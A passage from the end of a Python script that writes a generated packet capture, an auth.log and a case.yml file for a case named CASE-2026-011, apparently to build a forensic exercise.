    build_pcap().write(ev / "network" / "core-span_2026-11-18.pcap")
    (ev / WEB / "auth.log").write_text(build_authlog())
    (out / "case.yml").write_text(CASE_YML)
    print(f"case written to {out}")


if __name__ == "__main__":
    main(Path(sys.argv[1]) if len(sys.argv) > 1 else Path(__file__).resolve().parent.parent / "cases" / "CASE-2026-011")
